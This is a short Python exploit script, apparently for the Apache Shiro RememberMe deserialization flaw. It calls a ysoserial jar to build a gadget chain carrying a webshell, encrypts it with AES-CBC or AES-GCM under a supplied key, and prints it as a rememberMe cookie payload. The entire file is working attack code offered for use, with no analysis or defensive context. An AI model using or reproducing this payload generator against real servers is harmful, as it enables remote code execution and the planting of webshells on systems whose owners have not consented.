# coding: utf-8

import os
import argparse
import re
import base64
import sys
import uuid
import subprocess
import requests
import urllib3
from Crypto.Cipher import AES



def getClassLoader(assembly,ciphertype,key):  
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', assembly, 'webshell'], stdout=subprocess.PIPE)
    file_body = popen.stdout.read()  
    try:
        if ciphertype == 'GCM':
            base64_ciphertext = GCMCipher(key,file_body)
            print("payload is \r\nrememberMe="+base64_ciphertext.decode())
        
        if ciphertype == 'CBC':
            base64_ciphertext = CBCCipher(key,file_body)
            print("payload is \r\nrememberMe="+base64_ciphertext.decode())
               
    except Exception as e:
        print(e)
        pass


#1.4.2及以上版本使用GCM加密
def GCMCipher(key,file_body):
    iv = os.urandom(16)
    cipher = AES.new(base64.b64decode(key), AES.MODE_GCM, iv)          
    ciphertext, tag = cipher.encrypt_and_digest(file_body) 
    ciphertext = ciphertext + tag   
    base64_ciphertext = base64.b64encode(iv + ciphertext)
    return base64_ciphertext


def CBCCipher(key,file_body):
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    file_body = pad(file_body)
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    #parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-M', '--gadget', help='ysoserial gadget', required=True)
    parser.add_argument('-T', '--ciphertype', help='CipherType, GCM or CBC', required=True)
    parser.add_argument('-K', '--key', help='key', required=True)
    args = parser.parse_args()


    
    getClassLoader(args.gadget,args.ciphertype,args.key)
        

